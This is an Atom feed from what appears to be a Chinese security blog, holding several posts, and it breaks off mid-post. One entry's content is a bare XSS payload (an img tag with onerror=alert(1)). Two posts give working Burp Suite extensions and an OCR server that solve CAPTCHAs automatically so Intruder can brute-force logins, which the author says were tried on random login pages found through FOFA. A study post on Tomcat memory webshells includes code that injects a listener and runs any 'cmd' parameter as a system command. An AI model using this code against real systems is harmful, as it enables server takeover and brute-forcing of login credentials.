<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ja9er.github.io</id>
    <title>Ja9er&apos;s Studio</title>
    <updated>2022-01-17T03:44:40.496Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ja9er.github.io"/>
    <link rel="self" href="https://ja9er.github.io/atom.xml"/>
    <subtitle>燃烧掉总比消失好</subtitle>
    <logo>https://ja9er.github.io/images/avatar.png</logo>
    <icon>https://ja9er.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Ja9er&apos;s Studio</rights>
    <entry>
        <title type="html"><![CDATA[test]]></title>
        <id>https://ja9er.github.io/post/uA8jz16xz/</id>
        <link href="https://ja9er.github.io/post/uA8jz16xz/">
        </link>
        <updated>2022-01-17T03:40:21.000Z</updated>
        <content type="html"><![CDATA[<p><img src=x onerror=alert(1) >test</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从验证码爆破开始的burp插件学习]]></title>
        <id>https://ja9er.github.io/post/IX1z9lGDP/</id>
        <link href="https://ja9er.github.io/post/IX1z9lGDP/">
        </link>
        <updated>2022-01-17T03:25:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="从验证码爆破开始的burp插件学习">从验证码爆破开始的burp插件学习</h1>
<blockquote>
<p>PS：仅仅作为学习,没什么用</p>
</blockquote>
<p>之前改了一个验证码爆破的burp插件。小改了其他师傅的代码。</p>
<p>现在从头学习一下burp的插件开发，目标是实现在repeater模块的登录口自动更换实时验证码</p>
<p>因为python开发比较方便，这里直接选python。</p>
<h2 id="环境配置">环境配置</h2>
<p>在extender-Options-PythonEnvironment中配置你的jython.jar文件路径</p>
<p>py2下载burp包</p>
<p>然后就可以愉快的开始开发了</p>
<h2 id="实现">实现</h2>
<p>burp提供了所有API相关<a href="https://portswigger.net/burp/extender/api/index.html">文档</a>以及开发示例<a href="https://portswigger.net/burp/extender/">demo</a></p>
<p>之前改的脚本是爆破模块的，现在尝试改一个repeter模块的出来</p>
<p>通过文档和demo阅读，发现所有的插件都需要继承IBurpExtender这个类</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/7U4u6O"><img src="https://s4.ax1x.com/2022/01/17/7U4u6O.png" alt="7U4u6O.png" loading="lazy"></a></figure>
<p>所以首先需要一个类继承他，也就是这样</p>
<pre><code class="language-python">class BurpExtender(IBurpExtender):
</code></pre>
<p>IBurpExtender类默认需要registerExtenderCallbacks函数，这个函数用来注册初始化。Callback 此变量是在书写burp插件中最必不可少的变量，如果你需要调用你所导出的api的函数的话，必须要用Callback先注册一下，如下.registxxxxxx是待会儿我们调用的其他类的注册方法，这里暂时用registxxxxxx来代替</p>
<pre><code class="language-python">class BurpExtender(IBurpExtender):
	    def registerExtenderCallbacks(self, callbacks):
        	# 方便一会儿调用
       		self._callbacks = callbacks
       		self._callbacks.registxxxxxx(self)
            # 插件里面显示的名字
       		callbacks.setExtensionName(&quot;OCR_CAPTCHA_repeter&quot;)
</code></pre>
<p>然后我们不是要找repeter模块吗，在HTTP消息处理接口类中发现IHttpListener比较符合这个选择,拦截任何burp工具发出的request和response</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/7U4n1K"><img src="https://s4.ax1x.com/2022/01/17/7U4n1K.png" alt="7U4n1K.png" loading="lazy"></a></figure>
<p>函数长这样</p>
<pre><code class="language-java">processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
This method is invoked when an HTTP request is about to be issued, and when an HTTP response has been received.
</code></pre>
<p>第一个参数toolFlag判断从哪个工具传来的，这个参数在IBurpExtender初始化的callback中硬编码。如图,所以我们只需要判断是否repeater中传来就行</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/7U4KXD"><img src="https://s4.ax1x.com/2022/01/17/7U4KXD.png" alt="7U4KXD.png" loading="lazy"></a></figure>
<p>显然我们可以使用IHttpListener这个类了，此时代码如下,注册一个httplistener。使用<code>registerHttpListener</code></p>
<pre><code class="language-python">class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        # 方便一会调用
        self._callbacks = callbacks
        self._callbacks.registerHttpListener(self)
        #help类帮助解析数据
        self._helpers = callbacks.getHelpers()
        # 插件里面显示的名字
        callbacks.setExtensionName(&quot;OCR_CAPTCHA_repeter&quot;)
        print(&quot;init success&quot;)
     
</code></pre>
<p>IHttpListener具体的实现方法在它的processHttpMessage方法中，这也是我们继承后要实现的方法，也是刚刚在文档中看到的那个方法</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/7U4mp6"><img src="https://s4.ax1x.com/2022/01/17/7U4mp6.png" alt="7U4mp6.png" loading="lazy"></a></figure>
<p>实现代码如下</p>
<pre><code class="language-python">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
      	#toolFlag判断从REPEATER传来请求，messageIsRequest是一个坑点需要注意，它的值为是否已经发出请求的判断。不在实现方法中判断的话会发出两次请求从而造成Request has already been issued的错误
        if toolFlag == self._callbacks.TOOL_REPEATER and messageIsRequest==1:
            #上面引入的help类解析传入的信息
            analyIRequestInfo = self._helpers.analyzeRequest(messageInfo)
            #获取整个request的内容
            request = messageInfo.getRequest()
            #请求body内容需要计算缓存
            body = request[analyIRequestInfo.getBodyOffset():]
            headers = analyIRequestInfo.getHeaders()
            #获取request中我们自己加的header中字段内容，DDDDOCR表示请求验证码生成的url
            DDURL = re.findall(r&quot;DDDDOCR:(.*?)\,&quot;, str(headers))
            if len(DDURL) &gt; 0:
                cookie = re.findall(&quot;Cookie: (.*?)\s&quot;, str(headers))[0]
                #filed为自己定义的正则表达式，用来获取body中的验证码参数的值
                filed = re.findall(r&quot;filed:(.*?)\,&quot;, str(headers))[0]
                value = re.findall(filed, body.tostring())[0]#获取到验证码的值，方便后面替换
                OCR_CAPTCHA_url = DDURL[0]
                requestheaders = {
                    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;,
                    &quot;Cookie&quot;: cookie}
                request = urllib2.Request(OCR_CAPTCHA_url, headers=requestheaders)
                ssl._create_default_https_context = ssl._create_unverified_context
                host = ('127.0.0.1', 5000)
                CAPTCHA = urllib2.urlopen(request)  # 获取图片
                CAPTCHA_base64 = base64.b64encode(CAPTCHA.read())  # 把图片base64编码
                request = urllib2.Request('http://%s:%s/base64' % host, 'base64=' + CAPTCHA_base64)
                response = urllib2.urlopen(request).read()
                #body.tostring()转为字符串形式，type为str和python中类型一致
                data = str(body.tostring()).replace(value, response)
              	#构建新的请求替换原来的请求
                newHttpMessage = self._helpers.buildHttpMessage(headers, data)
                messageInfo.setRequest(newHttpMessage)
</code></pre>
<h2 id="效果">效果</h2>
<p>贴一个后端代码</p>
<pre><code class="language-python">from flask import Flask
from flask import request
import ddddocr
import re, time, base64
app = Flask(__name__)
#返回我们传的verify的值
@app.route('/test',methods=[&quot;POST&quot;])
def getrequest():
    verify = request.values.get(&quot;verify&quot;)
    return verify
@app.route('/',methods=[&quot;GET&quot;])
def show_image():
    with open('static/log.txt', 'r') as f:
        content = f.read()
    data = '&lt;title&gt;404 NOT FOUND&lt;/title&gt;&lt;body style=&quot;text-align:center&quot;&gt;&lt;h1&gt;验证码识别&lt;/h1&gt;&lt;p&gt;&lt;TABLE style=&quot;&quot; borderColor=&quot;&quot; height=40 cellPadding=1 align=center border=20&gt;&lt;tr align=center&gt;&lt;td&gt;验证码&lt;/td&gt;&lt;td&gt;识别结果&lt;/td&gt;&lt;td&gt;时间&lt;/td&gt;&lt;/tr&gt;%s&lt;/body&gt;' % (
        content)
    return data

@app.route('/base64',methods=[&quot;POST&quot;])
def ocr():
    count=5
    try:
        base64_img = request.values.get(&quot;base64&quot;)
        img_name = time.time()
        ocr = ddddocr.DdddOcr(show_ad=False)
        base64_img =str(base64_img).replace(' ', '+')
        img_bytes = base64.b64decode(base64_img)
        res = ocr.classification(img_bytes)
        with open('static/log.txt', 'r') as f:
            data = &quot;&quot;
            counts = 0
            content = f.read()
            pattern = re.compile(r'.*?\n')
            result1 = pattern.findall(content)
            for i in result1:
                counts += 1
                if counts &gt;= count: break
                data = data + i
        with open('static/log.txt', 'w+') as f:
            f.write('&lt;tr align=center&gt;&lt;td&gt;&lt;img src=&quot;data:image/png;base64,%s&quot;/&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\n' % (
            base64_img, res, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(int(img_name)))) + data)

        return res
    except Exception as e:
        return &quot;0000&quot;
if __name__ == '__main__':
    app.run()

</code></pre>
<p>随便找一个验证码生成url作为验证，可以看到返回的值是验证码图片的值，而不是request包中的1234</p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/7U4l0H"><img src="https://s4.ax1x.com/2022/01/17/7U4l0H.gif" alt="7U4l0H.gif" loading="lazy"></a></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从OCR库联动burp验证码爆破]]></title>
        <id>https://ja9er.github.io/post/RIelZKt8X/</id>
        <link href="https://ja9er.github.io/post/RIelZKt8X/">
        </link>
        <updated>2022-01-14T03:06:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="从ocr库联动burp验证码爆破">从OCR库联动burp验证码爆破</h1>
<h2 id="ocr库选择">OCR库选择</h2>
<p>这里直接选择DDDDOCR这个库，非常好用</p>
<p>首先PIP下载</p>
<blockquote>
<p>python3 -m pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple</p>
</blockquote>
<p>官方用法，这里的img_bytes是十六进制数据</p>
<pre><code class="language-python">import ddddocr
ocr = ddddocr.DdddOcr()
with open('1.png', 'rb') as f:
    img_bytes = f.read()
res = ocr.classification(img_bytes)
print(res)
</code></pre>
<p>效果可以看到还是非常不错的</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/7U2p4K"><img src="https://s4.ax1x.com/2022/01/17/7U2p4K.png" alt="7U2p4K.png" loading="lazy"></a></figure>
<h2 id="服务端">服务端</h2>
<p>因为DDDDOCR这个库是python3的，burp的jython是python2的，显然不能混在一起用。所以暂时设置为C/S架构。把验证码识别服务化。这里直接魔改其他师傅的项目。当然也可以用flask起一个轻量服务器。</p>
<p>这是python3的服务脚本，默认路径下展示最新识别的20个验证码,路径/base64 作为识别接口，获取传入的img base64后的数据，返回识别字符</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- conding:utf-8 -*-
import ddddocr
from http.server import HTTPServer, BaseHTTPRequestHandler
import re, time, base64, os
import urllib.parse

host = ('0.0.0.0', 8899)
count = 20  # 保存多少个验证码及结果

class Resquest(BaseHTTPRequestHandler):
    def handler(self):
        print(&quot;data:&quot;, self.rfile.readline().decode())
        self.wfile.write(self.rfile.readline())

    def do_GET(self):
        print(self.requestline)
        if self.path != '/':
            self.send_error(404, &quot;Page not Found!&quot;)
            return
        with open('temp/log.txt', 'r') as f:
            content = f.read()
        data = '&lt;title&gt;404 NOT FOUND&lt;/title&gt;&lt;body style=&quot;text-align:center&quot;&gt;&lt;h1&gt;验证码识别&lt;/h1&gt;&lt;p&gt;&lt;TABLE style=&quot;&quot; borderColor=&quot;&quot; height=40 cellPadding=1 align=center border=20&gt;&lt;tr align=center&gt;&lt;td&gt;验证码&lt;/td&gt;&lt;td&gt;识别结果&lt;/td&gt;&lt;td&gt;时间&lt;/td&gt;&lt;/tr&gt;%s&lt;/body&gt;'%(content)
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=UTF-8')
        self.end_headers()
        self.wfile.write(data.encode())
    def do_POST(self):
        text = ''
        try:
            if self.path != '/base64':
                self.send_error(404, &quot;Page not Found!&quot;)
                return
            req_datas = self.rfile.read(int(self.headers['content-length']))
            req_datas = req_datas.decode()
            base64_img = str(req_datas).replace(&quot;base64=&quot;, &quot;&quot;)
            base64_img = urllib.parse.unquote(base64_img)
            # print(base64_img.group(1)) #post base64参数的内容
            img_name=time.time()
            with open(&quot;temp/%s.png&quot;%img_name, 'wb') as f:
                f.write(base64.b64decode(base64_img))
                f.close()
            ocr = ddddocr.DdddOcr(show_ad=False)
            img_bytes = base64.b64decode(base64_img)
            res = ocr.classification(img_bytes)
            text = res
            print(text)
            with open('temp/log.txt', 'r') as f:
                data = &quot;&quot;
                counts = 0
                content = f.read()
                pattern = re.compile(r'.*?\n')
                result1 = pattern.findall(content)
                for i in result1:
                    counts += 1
                    if counts &gt;= count:break
                    data = data + i
            with open('temp/log.txt', 'w+') as f:
                f.write('&lt;tr align=center&gt;&lt;td&gt;&lt;img src=&quot;data:image/png;base64,%s&quot;/&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\n'%(base64_img,text,time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(int(img_name))))+ data)
            os.remove(&quot;temp/%s.png&quot; % img_name)
        except Exception as e:
            text = '0000'
            print('\n识别失败！\n')
            print(e)
        if text == '':
            text = '0000'
            print('\n识别失败！\n')
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(text.encode('utf-8'))


if __name__ == '__main__':
    server = HTTPServer(host, Resquest)
    print(&quot;Starting server, listen at: %s:%s&quot; % host)
    server.serve_forever()

</code></pre>
<p>随机在fofa上找了几个带验证码的登录口试了试，乱码是因为保存下来的字符编码从UTF8被换到了GBK</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/7UgzAx"><img src="https://s4.ax1x.com/2022/01/17/7UgzAx.png" alt="7UgzAx.png" loading="lazy"></a></figure>
<h2 id="burp插件">Burp插件</h2>
<p>burp给了很多api用于写插件，基本每个模块都给了。在extender-APIs中可以查看详情，因为验证码识别一般用于登录口爆破之类的模块，所以选择爆破模块也就是IIntruderPayloadGeneratorFactory。</p>
<pre><code class="language-python">#!/usr/bin/env python
# coding:utf-8
from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
import base64
import json
import re
import urllib2
import ssl

host = ('127.0.0.1', 8899)#服务端的IP和PORT

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):#IBurpExtender是每个插件都要用的，让burp识别你为插件
    def registerExtenderCallbacks(self, callbacks):
        #注册payload生成器
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        #插件里面显示的名字
        callbacks.setExtensionName(&quot;OCR_CAPTCHA&quot;)
        print 'OCR_CAPTCHA\n用法：\n在head头部添加DDDDOCR:验证码的URL\n\n如：\n\nPOST /login HTTP/1.1\nHost: www.baidu.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/plain, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nDDDDOCR:http://www.baidu.com/get-validate-code\nContent-Length: 84\nConnection: close\nCookie: JSESSIONID=24D59677C5EDF0ED7AFAB8566DC366F0\n\nusername=admin&amp;password=admin&amp;vcode=8888\n\n'

    def getGeneratorName(self):
        return &quot;OCR_CAPTCHA&quot;

    def createNewInstance(self, attack):
        return OCR_CAPTCHA(attack)

class OCR_CAPTCHA(IIntruderPayloadGenerator):
    def __init__(self, attack):
        tem = &quot;&quot;.join(chr(abs(x)) for x in attack.getRequestTemplate()) #request内容
        cookie = re.findall(&quot;Cookie: (.+?)\r\n&quot;, tem)[0] #获取cookie，用于请求验证码
        OCR_CAPTCHA = re.findall(&quot;DDDDOCR:(.+?)\r\n&quot;, tem)[0]
        ssl._create_default_https_context = ssl._create_unverified_context #忽略证书，防止证书报错
        self.OCR_CAPTCHA = OCR_CAPTCHA
        self.cookie = cookie
        self.max = 1 #payload最大使用次数
        self.num = 0 #标记payload的使用次数
        self.attack = attack

    def hasMorePayloads(self):
        #如果payload使用到了最大次数reset就清0
        if self.num == self.max:
            return False  # 当达到最大次数的时候就调用reset
        else:
            return True

    def getNextPayload(self, payload):
        OCR_CAPTCHA_url = self.OCR_CAPTCHA #验证码url
        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;,&quot;Cookie&quot;:self.cookie}
        request = urllib2.Request(OCR_CAPTCHA_url,headers=headers)
        CAPTCHA = urllib2.urlopen(request) #获取图片
        CAPTCHA_base64 = base64.b64encode(CAPTCHA.read()) #把图片base64编码
        request = urllib2.Request('http://%s:%s/base64'%host, 'base64='+CAPTCHA_base64)
        response = urllib2.urlopen(request).read()
        print(response)
        return response

    def reset(self):
        self.num = 0  # 清零
        return
</code></pre>
<p>在extensions中添加以后，随便找一个带验证码的登录入口测试。</p>
<p>使用intruder的Pitchfork模块，将post包中的验证码打上标记，并且新增一个字段DDDDOCR，值为验证码产生的地址</p>
<pre><code class="language-http">POST /index.php?c=index&amp;a=login HTTP/1.1
Host:host
Content-Length: 51
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://host
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://host/index.php?c=index&amp;a=login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
DDDDOCR:http://host/index.php?c=verify_code
Cookie: PHPSESSID=51ilefnld0hlvmq8lm82pa2jvu0macg2
Connection: close

user=§admin§&amp;password=123456&amp;VerifyCode=§z69s§&amp;login=
</code></pre>
<p>payload选择我们的插件</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/7UgvH1"><img src="https://s4.ax1x.com/2022/01/17/7UgvH1.png" alt="7UgvH1.png" loading="lazy"></a></figure>
<p>得到如下结果</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/7U2SN6"><img src="https://s4.ax1x.com/2022/01/17/7U2SN6.png" alt="7U2SN6.png" loading="lazy"></a></figure>
<p>参考</p>
<blockquote>
<p>https://github.com/smxiazi/NEW_xp_CAPTCHA</p>
<p>https://www.t00ls.cc/viewthread.php?tid=63498&amp;highlight=%E9%AA%8C%E8%AF%81%E7%A0%81</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Tomcat 内存马学习]]></title>
        <id>https://ja9er.github.io/post/tomcat-nei-cun-ma-xue-xi/</id>
        <link href="https://ja9er.github.io/post/tomcat-nei-cun-ma-xue-xi/">
        </link>
        <updated>2022-01-06T10:09:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="tomcat-内存马学习">Tomcat 内存马学习</h1>
<h2 id="前置知识">前置知识</h2>
<p>什么是Tomcat?</p>
<p>tomcat作为一个 Web 服务器，实现了两个非常核心的功能：</p>
<blockquote>
<p>**Http 服务器功能：**进行 Socket 通信(基于 TCP/IP)，解析 HTTP 报文</p>
<p>**Servlet 容器功能：**加载和管理 Servlet，由 Servlet 具体负责处理 Request 请求</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="image-20211229100649882.png" alt="" loading="lazy"></figure>
<p>HTTP服务器功能对应tomcat的组件连接器(Connector)，它主要实现三个功能</p>
<blockquote>
<ul>
<li>socket 通信，也就是网络编程</li>
<li>解析处理应用层协议，封装成一个 Request 对象</li>
<li>将 Request 转换为 ServletRequest，将 Response 转换为 ServletResponse</li>
</ul>
</blockquote>
<p>以上分别对应三个组件 EndPoint、Processor、Adapter 来完成。Endpoint 负责提供请求字节流给Processor，Processor 负责提供 Tomcat 定义的 Request 对象给 Adapter，Adapter 负责提供标准的 ServletRequest 对象给 Servlet 容器。</p>
<p>servlet容器功能对应tomcat的组件container，也叫Catalina，是Tomcat的核心。在Container中，有4种容器，分别是Engine、Host、Context、Wrapper。这四种容器成套娃式的分层结构设计。</p>
<blockquote>
<ul>
<li>Engine<br>
表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一个 Engine，最顶层容器组件，其下可以包含多个 Host</li>
<li>Host<br>
代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context</li>
<li>Context<br>
表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper</li>
<li>Wrapper<br>
表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等</li>
</ul>
</blockquote>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TxCeD1"><img src="https://s4.ax1x.com/2022/01/06/TxCeD1.png" alt="TxCeD1.png" loading="lazy"></a></figure>
<p>最后看看一个request的执行链可以大致理解</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TxCKUK"><img src="https://s4.ax1x.com/2022/01/06/TxCKUK.png" alt="TxCKUK.png" loading="lazy"></a></figure>
<h2 id="listener-内存马">listener 内存马</h2>
<p>请求网站的时候, 程序先执行listener监听器的内容：Listener -&gt; Filter -&gt; Servlet</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TxCM4O"><img src="https://s4.ax1x.com/2022/01/06/TxCM4O.png" alt="TxCM4O.png" loading="lazy"></a></figure>
<p>Listener是最先被加载的, 所以可以利用动态注册恶意的Listener内存马。而Listener分为以下几种：</p>
<ul>
<li>ServletContext，服务器启动和终止时触发</li>
<li>Session，有关Session操作时触发</li>
<li>Request，访问服务时触发</li>
</ul>
<p>其中关于监听Request对象的监听器是最适合做内存马的，只要访问服务就能触发操作。</p>
<h3 id="listener的实现和类型">Listener的实现和类型？</h3>
<p>Tomcat使用两类Listener接口分别是org.apache.catalina.LifecycleListener和原生Java.util.EvenListener。</p>
<p>LifecycleListener增加了生命周期管理，主要用于四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper。用于容器状态的判断和管理。在容器初始化的时候启用，但是作为攻击者是不可能控制容器初始化的时候的操作的。所以我们直接看<strong>EvenListener</strong></p>
<p>它是一个接口，具体的实现有很多</p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TxCUVP"><img src="https://s4.ax1x.com/2022/01/06/TxCUVP.png" alt="TxCUVP.png" loading="lazy"></a></figure>
<p>这里直接选择<strong>ServletRequestListener</strong>,因为ServletRequestListener用于监听ServletRequest的生成和销毁，也就是当我们访问任意资源，无论是servlet、jsp还是html静态资源，都会触发requestInitialized方法，当request结束时会触发Destroyed方法</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TxCd58"><img src="https://s4.ax1x.com/2022/01/06/TxCd58.png" alt="TxCd58.png" loading="lazy"></a></figure>
<p>这里在tomcat中创建一个TestListener看看是怎么执行的 ,在System.out.println(&quot;执行了TestListener requestDestroyed&quot;);这里打断点</p>
<pre><code class="language-java">package test;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println(&quot;执行了TestListener requestDestroyed&quot;);
    }
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println(&quot;执行了TestListener requestInitialized&quot;);
    }
}
</code></pre>
<p>得到如下调用栈</p>
<pre><code class="language-java">requestInitialized:13, TestListener (test)
fireRequestInitEvent:5982, StandardContext (org.apache.catalina.core)
invoke:129, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:364, CoyoteAdapter (org.apache.catalina.connector)
service:624, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1651, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
</code></pre>
<p>从requestInitialized往上推，可以发现在standardContext.fireRequestInitEvent()中已经是testlistener了</p>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TxC2V0"><img src="https://s4.ax1x.com/2022/01/06/TxC2V0.png" alt="TxC2V0.png" loading="lazy"></a></figure>
<p>往上跟踪可以看到listener是由getApplicationEventListeners来的，可以看到fireRequestInitEvent获取存储在StandardContext.ApplicationEventListeners中的监听器，并遍历调用listener#requestInitialized()</p>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TxChPU"><img src="https://s4.ax1x.com/2022/01/06/TxChPU.png" alt="TxChPU.png" loading="lazy"></a></figure>
<p>getApplicationEventListeners获取的值由applicationEventListenersList中获得</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TxCLa6"><img src="https://s4.ax1x.com/2022/01/06/TxCLa6.png" alt="TxCLa6.png" loading="lazy"></a></figure>
<p>applicationEventListenersList又可以由addApplicationEventListener设置</p>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TxP0dx"><img src="https://s4.ax1x.com/2022/01/06/TxP0dx.png" alt="TxP0dx.png" loading="lazy"></a></figure>
<p>经过以上分析，大致了解，Tomcat执行到StandardHostValve#invoke()时，获取存储在StandardContext.ApplicationEventListeners中的监听器，并遍历调用listener#requestInitialized()。所以我们只需要在StandardContext中<strong>向ApplicationEventListeners添加</strong>我们的listener即可注入一个listener。</p>
<p>这种添加方式可以使用addApplicationEventListener()设置</p>
<h3 id="获取standardcontext">获取StandardContext</h3>
<p>方法一:</p>
<pre><code class="language-jsp">&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>方法二:</p>
<pre><code class="language-jsp">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<h3 id="恶意类编写">恶意类编写</h3>
<p>获取之后就很简单了，直接添加自己定义的恶意类就行。这里给个我写的demo</p>
<pre><code class="language-java">import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
public class tomcat_listen  implements ServletRequestListener {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            tomcat_listen listenerDemo = new tomcat_listen();
            standardContext.addApplicationEventListener(listenerDemo);
        }catch (Exception e){
            System.out.println(e);
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        System.out.println(&quot;requestDestroyed success&quot;);
    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println(&quot;requestInitialized success&quot;);
    }
}

</code></pre>
<h3 id="效果演示">效果演示</h3>
<p>这里还是使用spring+log4j的靶场演示</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TxPcSe"><img src="https://s4.ax1x.com/2022/01/06/TxPcSe.png" alt="TxPcSe.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TxP2yd"><img src="https://s4.ax1x.com/2022/01/06/TxP2yd.png" alt="TxP2yd.png" loading="lazy"></a></figure>
<p>注入成功后访问任意一个URL，会发现执行了Listener的requestDestroyed和requestInitialized方法</p>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TxPhwt"><img src="https://s4.ax1x.com/2022/01/06/TxPhwt.png" alt="TxPhwt.png" loading="lazy"></a></figure>
<p>最后我们再加上命令执行的逻辑即可回显获取命令，注意这里写在requestInitialized中，因为response在requestDestroyed中我没有拿到，只能在初始化时获取</p>
<pre><code class="language-java">    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
        Field field = requestfacade.getClass().getDeclaredField(&quot;request&quot;);
        field.setAccessible(true);
        Request lrequest = (Request) field.get(requestfacade);
        Response lresponse = lrequest.getResponse();

        if(lrequest.getParameter(&quot;cmd&quot;) != null){
            Process process = Runtime.getRuntime().exec(lrequest.getParameter(&quot;cmd&quot;));
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
            lresponse.getOutputStream().flush();
            lresponse.getOutputStream().close();
            return;
    }
</code></pre>
<p>效果如下，可以看到 注入恶意代码后任意url都可执行命令</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TxPLOs"><img src="https://s4.ax1x.com/2022/01/06/TxPLOs.gif" alt="TxPLOs.gif" loading="lazy"></a></figure>
<h2 id="filter-内存马">Filter 内存马</h2>
<ul>
